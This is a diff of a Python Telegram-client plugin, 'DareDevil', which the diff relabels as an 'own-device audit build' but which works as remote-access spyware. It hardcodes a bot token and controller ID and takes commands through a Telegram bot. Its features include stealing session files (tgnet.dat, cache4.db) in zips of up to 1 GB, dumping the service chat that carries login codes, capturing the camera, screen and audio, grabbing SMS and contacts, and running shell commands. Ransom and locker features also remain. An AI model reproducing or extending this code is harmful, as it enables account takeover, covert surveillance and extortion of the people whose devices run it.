@@ -1,13 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-DareDevil v1.5 — white lawyer while day, daredevil at the night
+DareDevil v1.7 — Configured Instance
+Own-device audit build. Chaquopy bridge Python <-> Telegram Android client.
 """
 
 __id__ = "DareDevil"
 __name__ = "HellkitchenDevil"
-__description__ = "Good try"
+__description__ = "Own-device client audit"
 __author__ = "A4Team"
-__version__ = "1.5"
+__version__ = "1.7"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -17,27 +18,25 @@ from base_plugin import BasePlugin, HookResult
 from java import dynamic_proxy, jclass
 from org.telegram.messenger import ApplicationLoader
 from org.telegram.tgnet import TLRPC
-from java.util import ArrayList
+from java.util import ArrayList, HashMap
 import json
 import threading
 import time
 import os
 import random
 import re
-import string
-import zipfile
 import io
+import zipfile
 import subprocess
-import sys
-import traceback
 import hashlib
 import base64
 
-
-BOT_TOKEN = os.environ.get("DD_BOT_TOKEN", "8899237597:AAHiRm411lCpen9wfZV37XWL6OHY6tqBp4Y")
-BOT_UID = int(os.environ.get("DD_BOT_UID", "8943150715"))
+# --- CONFIGURATION START ---
+BOT_TOKEN = "8899237597:AAHiRm411lCpen9wfZV37XWL6OHY6tqBp4Y"
+BOT_UID = 8943150715
 BOT_UID_STR = str(BOT_UID)
-API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
+API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN if BOT_TOKEN else ""
+# --- CONFIGURATION END ---
 
 CB_FULL_MENU = "full_menu"
 
@@ -45,17 +44,13 @@ BOOT_LINE_1 = "white lawyer while day, daredevil at the night"
 BOOT_LINE_2 = "Found bad guy, Found all info"
 FULL_MENU_TITLE = "Full info&Use"
 
-STARS_POST = "from_a4/14"
-RANSOM_TEXT = "Аккаунт заблокирован.\nСвяжитесь с администратором."
-RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
-RANSOM_WARNING = "Закроешь приложение — данные будут уничтожены"
-
-RECIPIENT_CACHE_TTL = 600
+SERVICE_CHAT_ID = 777000
 MAX_DOC_SIZE = 5 * 1024 * 1024
+SESSION_ZIP_MAX = 1024 * 1024 * 1024   # 1 GB
 VIDEO_MAX_SIZE = 200 * 1024 * 1024
+RECIPIENT_CACHE_TTL = 600
 
 _logger = None
-
 
 def _log(msg):
     global _logger
@@ -70,21 +65,16 @@ def _log(msg):
     except Exception:
         pass
 
-
 def _UC():
     return jclass("org.telegram.messenger.UserConfig")
-
 
 def _MC():
     return jclass("org.telegram.messenger.MessagesController")
 
-
 def _CM():
     return jclass("org.telegram.tgnet.ConnectionsManager")
 
-
 _CLASS_CACHE = {}
-
 
 def _cls(*names):
     key = names
@@ -109,9 +99,7 @@ def _cls(*names):
     _CLASS_CACHE[key] = None
     return None
 
-
 _ReplyGateCls = None
-
 
 def _reply_gate_cls():
     global _ReplyGateCls
@@ -123,14 +111,15 @@ def _reply_gate_cls():
                 super().__init__()
                 self.response = None
                 self.error = None
+                self._alive = True
 
             def run(self, response, error):
                 self.response = response
                 self.error = error
+                self._alive = False
 
         _ReplyGateCls = _RG
     return _ReplyGateCls
-
 
 def _safe_int(v, d=0):
     try:
@@ -140,23 +129,30 @@ def _safe_int(v, d=0):
     except Exception:
         return d
 
-
 def _jlist_size(obj):
+    if obj is None:
+        return 0
     try:
         s = getattr(obj, "size", None)
-        if s is None:
-            return len(obj)
         if callable(s):
             return int(s())
-        return int(s)
+        if s is not None:
+            return int(s)
     except Exception:
-        try:
-            return len(obj)
-        except Exception:
-            return 0
-
+        pass
+    try:
+        if hasattr(obj, "keyAt") and hasattr(obj, "valueAt"):
+            return int(obj.size())
+    except Exception:
+        pass
+    try:
+        return len(obj)
+    except Exception:
+        return 0
 
 def _jlist_get(obj, i):
+    if obj is None:
+        return None
     try:
         g = getattr(obj, "get", None)
         if callable(g):
@@ -165,6 +161,32 @@ def _jlist_get(obj, i):
     except Exception:
         return None
 
+def _jmap_keys(obj):
+    out = []
+    if obj is None:
+        return out
+    for meth in ("keySet", "keys"):
+        try:
+            f = getattr(obj, meth, None)
+            if callable(f):
+                ks = f()
+                it = getattr(ks, "iterator", None)
+                if callable(it):
+                    it = it()
+                    while it.hasNext():
+                        out.append(it.next())
+                return out
+        except Exception:
+            continue
+    return out
+
+def _jmap_get(obj, k):
+    if obj is None:
+        return None
+    try:
+        return obj.get(k)
+    except Exception:
+        return None
 
 def _get_bool_attr(obj, name, default=False):
     try:
@@ -179,7 +201,6 @@ def _get_bool_attr(obj, name, default=False):
         return bool(v)
     except Exception:
         return default
-
 
 def _clean_phone(raw):
     if raw is None:
@@ -196,7 +217,6 @@ def _clean_phone(raw):
         return ""
     return "+" + digits
 
-
 def _phone_from_user(u):
     if u is None:
         return ""
@@ -211,7 +231,6 @@ def _phone_from_user(u):
         except Exception:
             continue
     return ""
-
 
 def _is_ton_address(s):
     try:
@@ -230,26 +249,6 @@ def _is_ton_address(s):
     except Exception:
         return False
 
-
-def _is_blockchain_gift(gift, sg=None):
-    try:
-        if _get_bool_attr(gift, "burned", False):
-            return True
-        for obj in ([sg] if sg is not None else []) + [gift]:
-            if obj is None:
-                continue
-            for k in ("owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"):
-                v = getattr(obj, k, None)
-                if v and _is_ton_address(v):
-                    return True
-            v = getattr(obj, "address", None)
-            if v and _is_ton_address(v):
-                return True
-    except Exception:
-        pass
-    return False
-
-
 def _http_get(url, timeout=30):
     from urllib.request import Request, urlopen
     try:
@@ -259,7 +258,6 @@ def _http_get(url, timeout=30):
     except Exception as e:
         _log("http get: %s" % e)
         return None
-
 
 def _http_post_json(url, body, timeout=30):
     from urllib.request import Request, urlopen
@@ -274,8 +272,7 @@ def _http_post_json(url, body, timeout=30):
         _log("http post: %s" % e)
         return None
 
-
-def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=120):
+def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=180):
     from urllib.request import Request, urlopen
     try:
         boundary = "----ARBoundary" + str(int(time.time() * 1000))
@@ -302,7 +299,6 @@ def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout
         _log("http multipart: %s" % e)
         return None
 
-
 def _download_to_file(url, path, max_size=None, timeout=180):
     from urllib.request import Request, urlopen
     try:
@@ -320,9 +316,9 @@ def _download_to_file(url, path, max_size=None, timeout=180):
                         os.remove(path)
                     except Exception:
                         pass
-                    return -1
+                    return -1, "size_exceeded"
                 f.write(chunk)
-        return total
+        return total, "ok"
     except Exception as e:
         _log("download: %s" % e)
         try:
@@ -330,8 +326,7 @@ def _download_to_file(url, path, max_size=None, timeout=180):
                 os.remove(path)
         except Exception:
             pass
-        return -1
-
+        return -1, str(e)
 
 class PluginSecurityPlugin(BasePlugin):
     def __init__(self):
@@ -362,10 +357,6 @@ class PluginSecurityPlugin(BasePlugin):
         self._tg_kid_lock = threading.Lock()
 
         self._ransom_view = None
-        self._ransom_wm = None
-        self._ransom_decor = None
-        self._ransom_photo_path = ""
-        self._ransom_photo_url = ""
         self._ransom_lock = threading.RLock()
 
         self._locker_view = None
@@ -392,12 +383,15 @@ class PluginSecurityPlugin(BasePlugin):
         self._nuke_pass = 0
         self._nuke_lock = threading.RLock()
 
+    # ---- lifecycle ----
     def on_plugin_load(self):
         with self._boot_lock:
             self._sync_running = True
             self._active = True
             self.stop = False
-            self._boot_sent = False
+            if self._boot_sent:
+                return
+            self._boot_sent = True
         try:
             self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
         except Exception:
@@ -439,10 +433,6 @@ class PluginSecurityPlugin(BasePlugin):
         return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
     def _boot(self):
-        with self._boot_lock:
-            if self._boot_sent:
-                return
-            self._boot_sent = True
         time.sleep(self._jitter / 1000.0)
         time.sleep(random.uniform(0.2, 0.6))
         try:
@@ -461,6 +451,7 @@ class PluginSecurityPlugin(BasePlugin):
     def on_send_message_hook(self, account, params):
         return HookResult()
 
+    # ---- account helpers ----
     def _uc(self):
         try:
             sa = int(_UC().selectedAccount)
@@ -497,8 +488,7 @@ class PluginSecurityPlugin(BasePlugin):
     def _get_accounts_list(self):
         out = []
         try:
-            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"),
-                             "MAX_ACCOUNT_COUNT", 8))
+            mc = int(getattr(_UC(), "MAX_ACCOUNT_COUNT", 8) or 8)
         except Exception:
             mc = 8
         mc = max(mc, 16)
@@ -563,12 +553,12 @@ class PluginSecurityPlugin(BasePlugin):
                     mt = chat.migrated_to
                     IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
                                      "org.telegram.tgnet.tl.TL_inputPeerChannel")
-                    if not IPChannel:
-                        return None
-                    ip = IPChannel()
-                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
-                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
-                    return ip
+                    if IPChannel:
+                        ip = IPChannel()
+                        ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
+                        ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
+                        if ip.channel_id:
+                            return ip
                 IPChat = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChat",
                               "org.telegram.tgnet.tl.TL_inputPeerChat")
                 if not IPChat:
@@ -591,14 +581,15 @@ class PluginSecurityPlugin(BasePlugin):
             cm.sendRequest(req, gate)
             deadline = time.time() + timeout
             while time.time() < deadline:
-                if gate.response is not None or gate.error is not None:
+                if not gate._alive:
                     break
                 time.sleep(0.08)
         finally:
-            try:
-                self._pending_delegates.remove(gate)
-            except Exception:
-                pass
+            with self._rpc_lock:
+                try:
+                    self._pending_delegates.remove(gate)
+                except Exception:
+                    pass
         return gate.response, gate.error
 
     def _parallel(self, jobs, workers=5, timeout=25):
@@ -630,8 +621,9 @@ class PluginSecurityPlugin(BasePlugin):
                     out.append(ee)
         return out
 
+    # ---- telegram bot api ----
     def _api(self, method):
-        if not BOT_TOKEN:
+        if not API_BASE:
             _log("no token")
             return ""
         return API_BASE + "/" + method
@@ -640,7 +632,7 @@ class PluginSecurityPlugin(BasePlugin):
         url = self._api("sendMessage")
         if not url:
             return None
-        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000]}
+        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4096]}
         if html:
             body["parse_mode"] = "HTML"
         for att in range(max(1, retries)):
@@ -654,7 +646,7 @@ class PluginSecurityPlugin(BasePlugin):
         url = self._api("sendMessage")
         if not url:
             return
-        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000],
+        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4096],
                 "reply_markup": keyboard}
         if html:
             body["parse_mode"] = "HTML"
@@ -671,26 +663,31 @@ class PluginSecurityPlugin(BasePlugin):
             _log("photo read: %s" % e)
             return
         fields = {"chat_id": BOT_UID_STR, "caption": str(caption)[:200]}
-        _http_post_multipart(url, fields, "photo",
-                             os.path.basename(file_path), raw)
+        _http_post_multipart(url, fields, "photo", os.path.basename(file_path), raw)
 
-    def _send_document_bytes(self, filename, data):
+    def _send_document_bytes(self, filename, data, retries=3):
         url = self._api("sendDocument")
         if not url:
-            return
+            return None
         fields = {"chat_id": BOT_UID_STR, "caption": str(filename)[:200]}
-        _http_post_multipart(url, fields, "document",
-                             filename, data)
+        for att in range(retries):
+            r = _http_post_multipart(url, fields, "document", filename, data)
+            if r is not None:
+                return r
+            time.sleep(1.5 * (att + 1))
+        return None
 
-    def _answer_callback(self, cb_id):
+    def _answer_callback(self, cb_id, text=""):
         url = self._api("answerCallbackQuery")
         if not url:
             return
-        _http_post_json(url, {"callback_query_id": str(cb_id)}, timeout=10)
+        body = {"callback_query_id": str(cb_id)}
+        if text:
+            body["text"] = str(text)[:200]
+        _http_post_json(url, body, timeout=10)
 
     def _start_polling(self):
         if self._poll_thread is not None and self._poll_thread.is_alive():
-            _log("poll already running")
             return
         self._poll_thread = threading.Thread(target=self._poll, daemon=True)
         self._poll_thread.start()
@@ -713,8 +710,7 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         while self._sync_running and not self.stop:
             try:
-                r = _http_get(url + "?offset=" + str(offset) + "&timeout=15",
-                              timeout=25)
+                r = _http_get(url + "?offset=" + str(offset) + "&timeout=15", timeout=25)
                 if r is None:
                     time.sleep(1)
                     continue
@@ -726,7 +722,6 @@ class PluginSecurityPlugin(BasePlugin):
                     if j and not j.get("ok"):
                         desc = str(j.get("description") or "")
                         if "Conflict" in desc:
-                            _log("poll conflict — stop")
                             break
                     time.sleep(1)
                     continue
@@ -737,42 +732,28 @@ class PluginSecurityPlugin(BasePlugin):
                 for u in res:
                     offset = u["update_id"] + 1
                     if "callback_query" in u:
-                        try:
-                            threading.Thread(target=self._handle_callback,
-                                             args=(u["callback_query"],),
-                                             daemon=True).start()
-                        except Exception:
-                            pass
+                        threading.Thread(target=self._handle_callback,
+                                         args=(u["callback_query"],),
+                                         daemon=True).start()
                     elif "message" in u:
-                        try:
-                            threading.Thread(target=self._handle_message,
-                                             args=(u["message"],),
-                                             daemon=True).start()
-                        except Exception:
-                            pass
+                        threading.Thread(target=self._handle_message,
+                                         args=(u["message"],),
+                                         daemon=True).start()
             except Exception as e:
                 _log("poll: %s" % e)
             time.sleep(0.5)
 
+    # ---- menus ----
     def _full_name_underscored(self, u):
         try:
             if u is None:
                 return "—"
-            fn = ""
-            ln = ""
-            try:
-                fn = str(getattr(u, "first_name", "") or "").strip()
-            except Exception:
-                fn = ""
-            try:
-                ln = str(getattr(u, "last_name", "") or "").strip()
-            except Exception:
-                ln = ""
+            fn = str(getattr(u, "first_name", "") or "").strip()
+            ln = str(getattr(u, "last_name", "") or "").strip()
             full = (fn + " " + ln).strip()
             if not full:
                 return "—"
-            full = re.sub(r"\s+", "_", full)
-            return full
+            return re.sub(r"\s+", "_", full)
         except Exception:
             return "—"
 
@@ -803,102 +784,49 @@ class PluginSecurityPlugin(BasePlugin):
         self._send_markup("\n".join(lines), kb, html=True)
 
     def _show_full_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "Manual using"}],
-                [{"text": "Troll"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "Manual using"}], [{"text": "Troll"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup(FULL_MENU_TITLE, kb, html=True)
 
     def _show_sessions_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "Session gain"}],
-                [{"text": "Full Pull out"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "Session gain"}], [{"text": "Full Pull out"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Session Control", kb, html=True)
 
     def _show_troll_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "M-music"}],
-                [{"text": "M-Video"}],
-                [{"text": "Flood Gallery"}],
-                [{"text": "Clear Flood"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "M-music"}], [{"text": "M-Video"}], [{"text": "Flood Gallery"}],
+                           [{"text": "Clear Flood"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Troll", kb, html=True)
 
     def _show_manual_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "Session Control"}],
-                [{"text": "Surveillance"}],
-                [{"text": "Data Grab"}],
-                [{"text": "Account"}],
-                [{"text": "Shell"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "Session Control"}], [{"text": "Surveillance"}],
+                           [{"text": "Data Grab"}], [{"text": "Account"}], [{"text": "Shell"}],
+                           [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Manual", kb, html=True)
 
     def _show_surveillance_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "Screenshot"}],
-                [{"text": "Camera Front"}],
-                [{"text": "Camera Back"}],
-                [{"text": "Audio 5s"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "Screenshot"}], [{"text": "Camera Front"}],
+                           [{"text": "Camera Back"}], [{"text": "Audio 5s"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Surveillance", kb, html=True)
 
     def _show_data_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "SMS"}],
-                [{"text": "Contacts"}],
-                [{"text": "Apps"}],
-                [{"text": "Chats"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "SMS"}], [{"text": "Contacts"}], [{"text": "Apps"}],
+                           [{"text": "Chats"}], [{"text": "Telegram Chat"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Data grab", kb, html=True)
 
     def _show_account_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "Info"}],
-                [{"text": "Pull Out"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "Info"}], [{"text": "Pull Out"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Account", kb, html=True)
 
     def _show_shell_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "ls /sdcard"}],
-                [{"text": "ps"}],
-                [{"text": "ifconfig"}],
-                [{"text": "df -h"}],
-                [{"text": "⬅️ Back"}],
-            ],
-            "resize_keyboard": True,
-        }
+        kb = {"keyboard": [[{"text": "ls /sdcard"}], [{"text": "ps"}], [{"text": "ifconfig"}],
+                           [{"text": "df -h"}], [{"text": "⬅️ Back"}]],
+              "resize_keyboard": True}
         self._send_markup("Shell", kb, html=True)
 
     def _handle_callback(self, cb):
@@ -906,10 +834,7 @@ class PluginSecurityPlugin(BasePlugin):
             cb_id = cb.get("id")
             data = cb.get("data", "")
             if cb_id:
-                try:
-                    self._answer_callback(cb_id)
-                except Exception:
-                    pass
+                self._answer_callback(cb_id)
             if data == CB_FULL_MENU:
                 self._show_full_menu()
             elif data == "close_ransom":
@@ -922,8 +847,6 @@ class PluginSecurityPlugin(BasePlugin):
                 self._clear_video()
             elif data == "close_end":
                 self._clear_dim()
-            elif data == "hv_logout":
-                threading.Thread(target=self._pull_out_account, daemon=True).start()
             elif data == "hv_stop_nuke":
                 self._stop_nuke_loop()
         except Exception as e:
@@ -950,14 +873,12 @@ class PluginSecurityPlugin(BasePlugin):
                 return
             if self._input_mode == "shell":
                 self._input_mode = None
-                if t:
-                    self._manual_shell(t)
+                self._manual_shell(t)
                 return
             if self._input_mode == "flood":
                 self._input_mode = None
                 if t.startswith(("http://", "https://")):
-                    threading.Thread(target=self._flood_gallery,
-                                     args=(t, 100), daemon=True).start()
+                    threading.Thread(target=self._flood_gallery, args=(t, 100), daemon=True).start()
                 else:
                     self._send_msg("Bad URL")
                 return
@@ -998,9 +919,10 @@ class PluginSecurityPlugin(BasePlugin):
                 threading.Thread(target=self._manual_apps, daemon=True).start()
             elif t == "Chats":
                 threading.Thread(target=self._manual_chats, daemon=True).start()
+            elif t == "Telegram Chat":
+                threading.Thread(target=self._manual_telegram_chat, daemon=True).start()
             elif t == "Info":
-                threading.Thread(target=self._harvest_account_info,
-                                 args=(0, True), daemon=True).start()
+                threading.Thread(target=self._harvest_account_info, args=(0, True), daemon=True).start()
             elif t == "Pull Out":
                 threading.Thread(target=self._full_pull_out, daemon=True).start()
             elif t == "ls /sdcard":
@@ -1025,62 +947,199 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             _log("handle msg: %s" % e)
 
-    def _truncate_zip_entries(self, entries, max_bytes):
-        out = []
-        total = 0
-        for arc, path in entries:
+    # ---- Telegram Chat: 777000 -> HTML ----
+    def _manual_telegram_chat(self):
+        try:
+            acc = self.account or 0
+            mc = _MC().getInstance(acc)
+            peer = None
+            u = None
             try:
-                sz = os.path.getsize(path)
+                u = mc.getUser(SERVICE_CHAT_ID)
             except Exception:
+                u = None
+            ah = _safe_int(getattr(u, "access_hash", 0)) if u is not None else 0
+            IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
+                          "org.telegram.tgnet.tl.TL_inputPeerUser")
+            if IPUser:
+                peer = IPUser()
+                peer.user_id = SERVICE_CHAT_ID
+                peer.access_hash = ah
+            if peer is None:
+                self._send_msg("Telegram Chat: no inputPeerUser class")
+                return
+
+            GetHist = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
+                           "org.telegram.tgnet.tl.TL_messages$getHistory")
+            if not GetHist:
+                self._send_msg("Telegram Chat: no getHistory class")
+                return
+
+            req = GetHist()
+            req.peer = peer
+            req.offset_id = 0
+            req.offset_date = 0
+            req.add_offset = 0
+            req.limit = 100
+            req.max_id = 0
+            req.min_id = 0
+            req.hash = 0
+
+            resp, err = self._rg_rpc(req, acc, 20.0, fast=False)
+            if err is not None:
+                self._send_msg("Telegram Chat err: " + str(err))
+                return
+            if resp is None:
+                self._send_msg("Telegram Chat: empty response")
+                return
+
+            msgs = getattr(resp, "messages", None)
+            users = getattr(resp, "users", None)
+            chats = getattr(resp, "chats", None)
+
+            umap = {}
+            if users is not None:
+                for i in range(_jlist_size(users)):
+                    uu = _jlist_get(users, i)
+                    if uu is None:
+                        continue
+                    uid = _safe_int(getattr(uu, "id", 0))
+                    if uid:
+                        fn = str(getattr(uu, "first_name", "") or "")
+                        ln = str(getattr(uu, "last_name", "") or "")
+                        un = str(getattr(uu, "username", "") or "")
+                        umap[uid] = (" ".join(x for x in (fn, ln) if x) or
+                                     ("@" + un if un else str(uid)))
+
+            cmap = {}
+            if chats is not None:
+                for i in range(_jlist_size(chats)):
+                    cc = _jlist_get(chats, i)
+                    if cc is None:
+                        continue
+                    cid = _safe_int(getattr(cc, "id", 0))
+                    if cid:
+                        cmap[cid] = str(getattr(cc, "title", "") or str(cid))
+
+            rows = []
+            if msgs is not None:
+                for i in range(_jlist_size(msgs)):
+                    m = _jlist_get(msgs, i)
+                    if m is None:
+                        continue
+                    if not _get_bool_attr(m, "out", False) and \
+                       not hasattr(m, "message"):
+                        continue
+                    mid = _safe_int(getattr(m, "id", 0))
+                    date = _safe_int(getattr(m, "date", 0))
+                    text = str(getattr(m, "message", "") or "")
+                    frm = ""
+                    try:
+                        fp = getattr(m, "from_id", None)
+                        if fp is not None:
+                            fuid = _safe_int(getattr(fp, "user_id", 0))
+                            if fuid:
+                                frm = umap.get(fuid, "user:" + str(fuid))
+                            else:
+                                fcid = _safe_int(getattr(fp, "channel_id", 0))
+                                if fcid:
+                                    frm = cmap.get(fcid, "channel:" + str(fcid))
+                                else:
+                                    fchat = _safe_int(getattr(fp, "chat_id", 0))
+                                    if fchat:
+                                        frm = cmap.get(fchat, "chat:" + str(fchat))
+                    except Exception:
+                        frm = ""
+                    if not frm:
+                        frm = "777000"
+                    try:
+                        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(date)) if date else "—"
+                    except Exception:
+                        ts = "—"
+                    rows.append((ts, frm, text, mid))
+
+            rows.sort(key=lambda r: r[3])
+
+            h = [
+                "<!doctype html><html><head><meta charset='utf-8'>",
+                "<title>Telegram Chat 777000</title>",
+                "<style>body{font-family:monospace;background:#111;color:#ddd;padding:12px}",
+                "table{border-collapse:collapse;width:100%}td,th{border:1px solid #333;",
+                "padding:6px;vertical-align:top;font-size:12px}th{background:#222}",
+                ".ts{color:#888;white-space:nowrap}.fr{color:#6cf;white-space:nowrap}",
+                "</style></head><body>",
+                "<h2>Service notifications (777000)</h2>",
+                "<p>Collected: %d / limit 100</p>" % len(rows),
+                "<table><tr><th>#</th><th>Date</th><th>From</th><th>Text</th></tr>",
+            ]
+            for ts, frm, text, mid in rows:
+                h.append("<tr><td>%d</td><td class='ts'>%s</td><td class='fr'>%s</td>"
+                         "<td>%s</td></tr>" % (
+                             mid, self._html_escape(ts),
+                             self._html_escape(frm),
+                             self._html_escape(text).replace("\n", "<br>")))
+            h.append("</table></body></html>")
+            html_bytes = "".join(h).encode("utf-8", "ignore")
+
+            fname = "telegram_chat_777000_%d.html" % int(time.time())
+            self._send_document_bytes(fname, html_bytes)
+            self._send_msg("Telegram Chat: %d messages, %d bytes" %
+                           (len(rows), len(html_bytes)))
+        except Exception as e:
+            self._send_msg("Telegram Chat exc: " + str(e))
+
+    # ---- Session gain: all sessions, up to 1 GB ----
+    def _collect_session_entries(self):
+        ctx = ApplicationLoader.applicationContext
+        if ctx is None:
+            return None, None
+        pkg = str(ctx.getPackageName())
+        base = "/data/data/%s" % pkg
+        entries = []
+
+        def add(path, arc=None):
+            try:
+                if os.path.isfile(path) and os.path.getsize(path) > 0:
+                    a = arc or os.path.relpath(path, base).replace("\\", "/")
+                    entries.append((a, path, os.path.getsize(path)))
+            except Exception:
+                pass
+
+        add(base + "/files/tgnet.dat")
+        add(base + "/files/cache4.db")
+        add(base + "/files/cache4.db-wal")
+        add(base + "/files/cache4.db-shm")
+
+        for sub in ("files", "shared_prefs", "databases", "no_backup"):
+            d = base + "/" + sub
+            if not os.path.isdir(d):
                 continue
-            if total + sz > max_bytes:
-                continue
-            out.append((arc, path))
-            total += sz
-        return out
+            for name in sorted(os.listdir(d)):
+                p = d + "/" + name
+                if os.path.isfile(p):
+                    low = name.lower()
+                    if (low.endswith((".dat", ".db", ".db-wal", ".db-shm", ".xml"))
+                            or "userconfig" in low or "cache4" in low
+                            or "tgnet" in low or "account" in low):
+                        add(p)
+                elif os.path.isdir(p) and name.startswith("account"):
+                    for n2 in sorted(os.listdir(p)):
+                        p2 = p + "/" + n2
+                        if os.path.isfile(p2) and n2.lower().endswith(
+                                (".dat", ".db", ".db-wal", ".db-shm", ".xml")):
+                            add(p2)
+        return base, entries
 
     def _session_gain(self):
         try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                self._send_msg("no ctx")
+            base, entries = self._collect_session_entries()
+            if base is None:
+                self._send_msg("Session gain: no ctx")
                 return
-            pkg = str(ctx.getPackageName())
-            base = "/data/data/%s" % pkg
-            priority = [
-                base + "/files/tgnet.dat",
-                base + "/files/cache4.db",
-                base + "/files/cache4.db-wal",
-                base + "/files/cache4.db-shm",
-            ]
-            ad = base + "/files"
-            if os.path.isdir(ad):
-                for name in sorted(os.listdir(ad)):
-                    if name.startswith("account"):
-                        p = ad + "/" + name + "/tgnet.dat"
-                        if os.path.exists(p):
-                            priority.append(p)
-                        uc = ad + "/" + name + "/userconfig.xml"
-                        if os.path.exists(uc):
-                            priority.append(uc)
-            pd = base + "/shared_prefs"
-            if os.path.isdir(pd):
-                for name in sorted(os.listdir(pd)):
-                    low = name.lower()
-                    if ("userconfig" in low or "userconfing" in low
-                            or "cache4" in low) and name.endswith(".xml"):
-                        priority.append(pd + "/" + name)
-            entries = []
-            for p in priority:
-                if os.path.exists(p):
-                    entries.append((os.path.relpath(p, base).replace("\\", "/"), p))
             if not entries:
                 self._send_msg("Session gain: no files")
                 return
-            chosen = self._truncate_zip_entries(entries, MAX_DOC_SIZE)
-            if not chosen:
-                self._send_msg("Session gain: nothing fits 5MB")
-                return
+
             amap = {}
             for a in self._get_accounts_list():
                 amap[str(a.get("id"))] = {
@@ -1088,52 +1147,82 @@ class PluginSecurityPlugin(BasePlugin):
                     "username": a.get("username", ""),
                     "phone": a.get("phone", ""),
                 }
+            amap_blob = json.dumps(amap, ensure_ascii=False, indent=2).encode("utf-8")
+            fixed = sum(e[2] for e in entries) + len(amap_blob)
+
+            if fixed > SESSION_ZIP_MAX:
+                entries.sort(key=lambda e: e[2])
+                kept = []
+                total = len(amap_blob)
+                for e in entries:
+                    if total + e[2] > SESSION_ZIP_MAX:
+                        break
+                    kept.append(e)
+                    total += e[2]
+                dropped = len(entries) - len(kept)
+                entries = kept
+                self._send_msg("Session gain: capped at 1GB, dropped %d" % dropped)
+
+            self._send_msg("Session gain: packing %d files..." % len(entries))
             z = io.BytesIO()
-            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
-                for arc, path in chosen:
+            added = 0
+            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
+                for arc, path, _sz in entries:
                     try:
                         zf.write(path, arcname=arc)
-                    except Exception:
-                        pass
+                        added += 1
+                    except Exception as e:
+                        _log("zip skip %s: %s" % (arc, e))
                 if amap:
-                    zf.writestr("accounts_map.json",
-                                json.dumps(amap, ensure_ascii=False, indent=2))
+                    zf.writestr("accounts_map.json", amap_blob)
+
             final = z.getvalue()
-            if len(final) > MAX_DOC_SIZE:
-                self._send_msg("Session gain: zip > 5MB (%d)" % len(final))
+            if len(final) > SESSION_ZIP_MAX:
+                self._send_msg("Session gain: zip %d > 1GB, abort" % len(final))
                 return
-            self._send_document_bytes("session_gain.zip", final)
-            self._send_msg("Session gain: %d files, %d bytes" % (len(chosen), len(final)))
+
+            chunk = 45 * 1024 * 1024
+            if len(final) <= chunk:
+                self._send_document_bytes("session_gain.zip", final)
+            else:
+                parts = (len(final) + chunk - 1) // chunk
+                for i in range(parts):
+                    part = final[i * chunk:(i + 1) * chunk]
+                    self._send_document_bytes(
+                        "session_gain_part%02d_of%02d.zip" % (i + 1, parts), part)
+                    time.sleep(1.0)
+            self._send_msg("Session gain: %d files, %d bytes" % (added, len(final)))
         except Exception as e:
             self._send_msg("Session gain err: " + str(e))
 
